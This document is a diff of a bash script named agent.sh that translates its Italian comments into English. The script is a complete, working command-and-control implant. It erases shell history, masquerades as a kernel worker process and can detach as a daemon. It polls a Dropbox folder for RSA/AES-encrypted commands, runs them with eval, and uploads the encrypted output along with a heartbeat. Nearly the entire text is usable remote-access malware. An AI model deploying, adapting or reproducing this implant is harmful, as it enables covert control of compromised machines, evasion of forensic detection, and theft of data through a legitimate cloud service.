@@ -1,24 +1,18 @@
 #!/bin/bash
 
 ################################################################################
-
 # SCRIPT: agent.sh (Drop-Dead Client) - FILELESS VERSION
-# DESCRIZIONE: Agent C2 che esegue comandi cifrati da Dropbox
-
-# VERSIONE: 2.3 Fileless Enhanced with Configurable Timing
-# VERSIONE PRECEDENTE: Script base disponibile come agent_v1.sh
-
-# [... TUTTO IL COMMENTO INIZIALE UGUALE ...]
-
+# DESCRIPTION: C2 agent that executes encrypted commands from Dropbox
+# VERSION: 2.3 - Fileless Enhanced with Configurable Timing
 ################################################################################
 
-# === MODALITÀ QUIET ===
+# === QUIET MODE ===
 QUIET_MODE=0
 if [ "$1" = "-q" ] || [ "$2" = "-q" ] || [ "$3" = "-q" ]; then
     QUIET_MODE=1
 fi
 
-# === MODALITÀ DAEMON (DETACH) ===
+# === DAEMON MODE (DETACH) ===
 DAEMON_MODE=0
 if [ "$1" = "-d" ] || [ "$2" = "-d" ] || [ "$3" = "-d" ]; then
     DAEMON_MODE=1
@@ -29,20 +23,20 @@ log() {
 }
 
 # === ANTI-FORENSIC MEASURES ===
-# 1. Disabilita bash history
+# 1. Disable bash history
 unset HISTFILE
 export HISTSIZE=0
 export HISTFILESIZE=0
 
-# 2. Se daemon mode richiesto, detach completamente
+# 2. If daemon mode requested, detach completely
 if [ $DAEMON_MODE -eq 1 ] && [ "$1" != "--daemonized" ]; then
-    log "[DAEMON]: Avvio modalità daemon (detach completo)..."
+    log "[DAEMON]: Starting daemon mode (complete detach)..."
     
-    # Costruisci argomenti
+    # Build arguments
     DAEMON_ARGS="--daemonized --masked"
     [ $QUIET_MODE -eq 1 ] && DAEMON_ARGS="$DAEMON_ARGS -q"
     
-    # Prova setsid (preferito), fallback nohup
+    # Try setsid (preferred), fallback nohup
     if command -v setsid >/dev/null 2>&1; then
         setsid bash "$0" $DAEMON_ARGS </dev/null >/dev/null 2>&1 &
         PID=$!
@@ -52,20 +46,20 @@ if [ $DAEMON_MODE -eq 1 ] && [ "$1" != "--daemonized" ]; then
     fi
     
     disown 2>/dev/null || true
-    echo "[DAEMON]: Agent avviato in background (PID: $PID)"
+    echo "[DAEMON]: Agent started in background (PID: $PID)"
     exit 0
 fi
 
-# 3. Maschera processo come kernel worker thread
+# 3. Mask process as kernel worker thread
 if [ "$1" != "--masked" ] && [ "$2" != "--masked" ] && [ "$1" != "--daemonized" ]; then
     MASK_ARGS="--masked"
     [ $QUIET_MODE -eq 1 ] && MASK_ARGS="$MASK_ARGS -q"
     exec -a "[kworker/u:0]" bash "$0" $MASK_ARGS
 fi
 
-# 4. Trap per cleanup automatico all'uscita
+# 4. Trap for automatic cleanup on exit
 cleanup() {
-    log "[CLEANUP]: Pulizia memoria in corso..." >&2
+    log "[CLEANUP]: Memory cleanup in progress..." >&2
     
     unset APP_KEY APP_SECRET REFRESH_TOKEN ACCESS_TOKEN
     unset PUBLIC_KEY PK1 PK2 PK3 PK4
@@ -79,17 +73,17 @@ cleanup() {
         unset dummy
     done
     
-    log "[CLEANUP]: Memoria pulita" >&2
+    log "[CLEANUP]: Memory cleaned" >&2
 }
 
 trap cleanup EXIT TERM
 
-# === CONFIGURAZIONE OAUTH2 (offuscate base64) ===
+# === OAUTH2 CONFIGURATION (base64 obfuscated) ===
 APP_KEY=$(echo "PLACEHOLDER_APP_KEY_B64" | base64 -d)
 APP_SECRET=$(echo "PLACEHOLDER_APP_SECRET_B64" | base64 -d)
 REFRESH_TOKEN=$(echo "PLACEHOLDER_REFRESH_TOKEN_B64" | base64 -d)
 
-# === CHIAVE RSA PUBBLICA (splittata e offuscata) ===
+# === RSA PUBLIC KEY (split and obfuscated) ===
 PK1="PLACEHOLDER_PK1"
 PK2="PLACEHOLDER_PK2"
 PK3="PLACEHOLDER_PK3"
@@ -98,25 +92,25 @@ PK4="PLACEHOLDER_PK4"
 PUBLIC_KEY=$(echo "${PK1}${PK2}${PK3}${PK4}" | base64 -d)
 unset PK1 PK2 PK3 PK4
 
-# === CONFIGURAZIONE DROPBOX ===
+# === DROPBOX CONFIGURATION ===
 FOLDER_PATH="/Machine1"
 INPUT_FILE="/input.txt"
 OUTPUT_FILE="/output.txt"
 HEARTBEAT_FILE="/heartbeat.txt"
 
-# === CONFIGURAZIONE SLEEP ===
+# === SLEEP CONFIGURATION ===
 BASE_SLEEP=PLACEHOLDER_BASE_SLEEP
 JITTER_PERCENT=PLACEHOLDER_JITTER_PERCENT
 JITTER=$((BASE_SLEEP * JITTER_PERCENT / 100))
 
 log "[CONFIG]: Base sleep: ${BASE_SLEEP}s, Jitter: ${JITTER_PERCENT}%"
 
-# === VARIABILE ACCESS TOKEN (in-memory) ===
+# === ACCESS TOKEN VARIABLE (in-memory) ===
 ACCESS_TOKEN=""
 
-# === FUNZIONE REFRESH ACCESS TOKEN (fileless) ===
+# === REFRESH ACCESS TOKEN FUNCTION (fileless) ===
 refresh_access_token() {
-    log "[TOKEN]: Refresh access token..."
+    log "[TOKEN]: Refreshing access token..."
     
     response=$(curl -s -X POST https://api.dropboxapi.com/oauth2/token \
         -d refresh_token=$REFRESH_TOKEN \
@@ -128,28 +122,28 @@ refresh_access_token() {
     
     if [ -n "$new_token" ]; then
         ACCESS_TOKEN="$new_token"
-        log "[TOKEN]: [OK] Token aggiornato (in-memory)"
+        log "[TOKEN]: [OK] Token updated (in-memory)"
         return 0
     else
-        log "[TOKEN]: [X] ERRORE refresh"
+        log "[TOKEN]: [X] Refresh ERROR"
         return 1
     fi
 }
 
-# === GENERA TOKEN INIZIALE ===
+# === GENERATE INITIAL TOKEN ===
 refresh_access_token || exit 1
 
-# === LOOP INFINITO ===
+# === INFINITE LOOP ===
 while true; do
     sleep_time=$(awk -v base=$BASE_SLEEP -v max=$JITTER 'BEGIN{srand(); jitter=rand()*max*2-max; printf "%.0f", base+jitter}')
     
     log ""
     log "========================================="
-    log "=== AVVIO CICLO ==="
+    log "=== CYCLE START ==="
     log "========================================="
     
     # === HEARTBEAT UPDATE ===
-    log "[HEARTBEAT]: Aggiornamento timestamp..."
+    log "[HEARTBEAT]: Updating timestamp..."
     timestamp=$(date +%s)
     
     response=$(echo -n "$timestamp" | curl -s -X POST https://content.dropboxapi.com/2/files/upload \
@@ -159,7 +153,7 @@ while true; do
         --data-binary @-)
     
     if echo "$response" | grep -q "expired_access_token\|invalid_access_token"; then
-        log "[HEARTBEAT]: [!] Token scaduto, refresh e retry..."
+        log "[HEARTBEAT]: [!] Token expired, refreshing and retrying..."
         refresh_access_token || exit 1
         
         response=$(echo -n "$timestamp" | curl -s -X POST https://content.dropboxapi.com/2/files/upload \
@@ -171,16 +165,16 @@ while true; do
     
     log "[HEARTBEAT]: [OK] Timestamp: $timestamp"
     
-    # === DOWNLOAD COMANDO CIFRATO ===
+    # === DOWNLOAD ENCRYPTED COMMAND ===
     log ""
-    log "[INPUT]: Download comando cifrato..."
+    log "[INPUT]: Downloading encrypted command..."
     
     encrypted_input=$(curl -s -X POST https://content.dropboxapi.com/2/files/download \
         --header "Authorization: Bearer $ACCESS_TOKEN" \
         --header "Dropbox-API-Arg: {\"path\":\"$FOLDER_PATH$INPUT_FILE\"}")
     
     if echo "$encrypted_input" | grep -q "expired_access_token\|invalid_access_token"; then
-        log "[INPUT]: [!] Token scaduto, refresh e retry..."
+        log "[INPUT]: [!] Token expired, refreshing and retrying..."
         refresh_access_token || exit 1
         
         encrypted_input=$(curl -s -X POST https://content.dropboxapi.com/2/files/download \
@@ -189,23 +183,23 @@ while true; do
     fi
     
     if [ "$encrypted_input" = "MZ" ]; then
-        log "[INPUT]: Nessun comando (MZ marker)"
+        log "[INPUT]: No command (MZ marker)"
         unset encrypted_input
-        log "[SLEEP]: Attesa ${sleep_time}s"
+        log "[SLEEP]: Waiting ${sleep_time}s"
         sleep "$sleep_time"
-        log "=== FINE CICLO ==="
+        log "=== CYCLE END ==="
         continue
     fi
     
-    # === DECIFRATURA COMANDO (IBRIDA RSA+AES) ===
-    log "[INPUT]: Comando cifrato ricevuto: ${encrypted_input:0:50}..."
-    log "[INPUT]: Decifratura ibrida (RSA+AES)..."
+    # === COMMAND DECRYPTION (HYBRID RSA+AES) ===
+    log "[INPUT]: Encrypted command received: ${encrypted_input:0:50}..."
+    log "[INPUT]: Hybrid decryption (RSA+AES)..."
     
     encrypted_aes_key=$(echo "$encrypted_input" | cut -d':' -f1)
     encrypted_command=$(echo "$encrypted_input" | cut -d':' -f2-)
     
     if [ -z "$encrypted_aes_key" ] || [ -z "$encrypted_command" ]; then
-        log "[INPUT]: [X] ERRORE formato input (separator ':' assente)"
+        log "[INPUT]: [X] ERROR invalid format (separator ':' missing)"
         unset encrypted_input encrypted_aes_key encrypted_command
         sleep "$sleep_time"
         continue
@@ -215,14 +209,14 @@ while true; do
         openssl rsautl -verify -pubin -inkey <(echo "$PUBLIC_KEY") 2>/dev/null)
     
     if [ -z "$aes_credentials" ]; then
-        log "[INPUT]: [X] ERRORE decifratura RSA (firma non valida o public key errata)"
+        log "[INPUT]: [X] ERROR RSA decryption (invalid signature or wrong public key)"
         unset encrypted_input encrypted_aes_key encrypted_command aes_credentials
         sleep "$sleep_time"
         continue
     fi
     
     if ! echo "$aes_credentials" | grep -qE '^[0-9a-f]{64}:[0-9a-f]{32}$'; then
-        log "[INPUT]: [X] ERRORE formato AES credentials (atteso: 64hex:32hex)"
+        log "[INPUT]: [X] ERROR AES credentials format (expected: 64hex:32hex)"
         unset encrypted_input encrypted_aes_key encrypted_command aes_credentials
         sleep "$sleep_time"
         continue
@@ -237,39 +231,40 @@ while true; do
     unset encrypted_input encrypted_aes_key encrypted_command aes_credentials
     
     if [ -z "$command_to_run" ]; then
-        log "[INPUT]: [X] ERRORE decifratura AES (chiave/IV errati o payload corrotto)"
+        log "[INPUT]: [X] ERROR AES decryption (wrong key/IV or corrupted payload)"
         unset aes_key aes_iv command_to_run
         sleep "$sleep_time"
         continue
     fi
     
-    log "[INPUT]: [OK] Comando decifrato: '$command_to_run'"
+    log "[INPUT]: [OK] Command decrypted: '$command_to_run'"
     
-    # === CONTROLLA SE EXIT ===
+    # === CHECK IF EXIT ===
     if [ "$command_to_run" = "EXIT" ]; then
-        log "[INPUT]: Comando EXIT ricevuto"
-        log "[AGENT]: Terminazione agent..."
+        log "[INPUT]: EXIT command received"
+        log "[AGENT]: Terminating agent..."
         exit 0
     fi
     
-    # === ESECUZIONE COMANDO ===
-    log "[EXEC]: Esecuzione comando..."
+    # === COMMAND EXECUTION ===
+    log "[EXEC]: Executing command..."
     output=$(eval "$command_to_run" 2>&1)
+    
     log "[EXEC]: Output (${#output} bytes):"
     [ $QUIET_MODE -eq 0 ] && echo "$output"
     
     unset command_to_run aes_key aes_iv
     
-    # === CIFRATURA OUTPUT (IBRIDA RSA+AES) ===
+    # === OUTPUT ENCRYPTION (HYBRID RSA+AES) ===
     log ""
-    log "[OUTPUT]: Cifratura output (ibrida RSA+AES)..."
+    log "[OUTPUT]: Encrypting output (hybrid RSA+AES)..."
     
     aes_key_out=$(openssl rand -hex 32)
     aes_iv_out=$(openssl rand -hex 16)
     
     if ! echo "$aes_key_out" | grep -qE '^[0-9a-f]{64}$' || \
        ! echo "$aes_iv_out" | grep -qE '^[0-9a-f]{32}$'; then
-        log "[OUTPUT]: [X] ERRORE generazione chiavi AES"
+        log "[OUTPUT]: [X] ERROR generating AES keys"
         encrypted_result=$(echo -n "[ERROR_KEY_GENERATION]" | base64 -w 0)
         unset output aes_key_out aes_iv_out
     else
@@ -284,17 +279,17 @@ while true; do
         
         if [ -n "$encrypted_output" ] && [ -n "$encrypted_aes_out" ]; then
             encrypted_result="${encrypted_aes_out}:${encrypted_output}"
-            log "[OUTPUT]: [OK] Output cifrato (${#encrypted_result} bytes)"
+            log "[OUTPUT]: [OK] Output encrypted (${#encrypted_result} bytes)"
         else
-            log "[OUTPUT]: [X] ERRORE cifratura output"
+            log "[OUTPUT]: [X] Encryption ERROR"
             encrypted_result=$(echo -n "[ERROR_ENCRYPTION]" | base64 -w 0)
         fi
         
         unset aes_key_out aes_iv_out aes_credentials_out encrypted_aes_out encrypted_output
     fi
     
-    # === UPLOAD OUTPUT CIFRATO ===
-    log "[OUTPUT]: Upload output cifrato..."
+    # === UPLOAD ENCRYPTED OUTPUT ===
+    log "[OUTPUT]: Uploading encrypted output..."
     
     response=$(echo -n "$encrypted_result" | curl -s -X POST https://content.dropboxapi.com/2/files/upload \
         --header "Authorization: Bearer $ACCESS_TOKEN" \
@@ -303,7 +298,7 @@ while true; do
         --data-binary @-)
     
     if echo "$response" | grep -q "expired_access_token\|invalid_access_token"; then
-        log "[OUTPUT]: [!] Token scaduto, refresh e retry..."
+        log "[OUTPUT]: [!] Token expired, refreshing and retrying..."
         refresh_access_token || exit 1
         
         response=$(echo -n "$encrypted_result" | curl -s -X POST https://content.dropboxapi.com/2/files/upload \
@@ -313,12 +308,12 @@ while true; do
             --data-binary @-)
     fi
     
-    log "[OUTPUT]: [OK] File aggiornato"
+    log "[OUTPUT]: [OK] File updated"
     
     unset encrypted_result
     
-    # === PULIZIA INPUT FILE ===
-    log "[INPUT]: Pulizia file input..."
+    # === CLEAN INPUT FILE ===
+    log "[INPUT]: Cleaning input file..."
     
     response=$(echo -n "MZ" | curl -s -X POST https://content.dropboxapi.com/2/files/upload \
         --header "Authorization: Bearer $ACCESS_TOKEN" \
@@ -327,7 +322,7 @@ while true; do
         --data-binary @-)
     
     if echo "$response" | grep -q "expired_access_token\|invalid_access_token"; then
-        log "[INPUT]: [!] Token scaduto, refresh e retry..."
+        log "[INPUT]: [!] Token expired, refreshing and retrying..."
         refresh_access_token || exit 1
         
         response=$(echo -n "MZ" | curl -s -X POST https://content.dropboxapi.com/2/files/upload \
@@ -337,11 +332,11 @@ while true; do
             --data-binary @-)
     fi
     
-    log "[INPUT]: [OK] File pulito (MZ)"
+    log "[INPUT]: [OK] File cleaned (MZ)"
     
-    # === SLEEP CON JITTER ===
+    # === SLEEP WITH JITTER ===
     log ""
-    log "[SLEEP]: Attesa ${sleep_time}s"
+    log "[SLEEP]: Waiting ${sleep_time}s"
     sleep "$sleep_time"
-    log "=== FINE CICLO ==="
+    log "=== CYCLE END ==="
 done
